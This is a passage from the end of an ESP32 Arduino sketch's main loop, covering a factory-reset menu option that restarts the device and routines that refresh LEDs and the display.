      showMsg("Factory reset done");
      delay(2000);
      ESP.restart();
    } else if (down) {
      appState = STATE_MAIN_MENU;
      needRedraw = true;
    }
  }

  // ============================================================
  // ОБНОВЛЕНИЕ LED И ДИСПЛЕЯ
  // ============================================================
  updateLedBoard();
  updateLedKeyboard();
  if (needRedraw && displayOn) updateDisplay();
  delay(5);
}
